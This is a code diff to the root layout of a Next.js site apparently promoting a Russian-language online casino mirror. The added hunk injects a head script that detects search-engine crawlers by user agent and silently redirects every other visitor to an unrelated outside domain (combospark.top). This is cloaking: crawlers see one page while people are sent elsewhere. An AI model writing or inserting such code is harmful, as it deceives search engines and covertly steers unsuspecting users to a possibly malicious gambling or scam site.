@@ -108,6 +108,21 @@ export default function RootLayout({
           content="Beef Casino официальный сайт: регистрация, вход и игра онлайн. Рабочее зеркало Биф Казино на сегодня."
         />
         <meta name="twitter:image" content="https://beef2casino.vercel.app/images/beef-hero.jpg" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aeaofj2k27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}</body>
     </html>
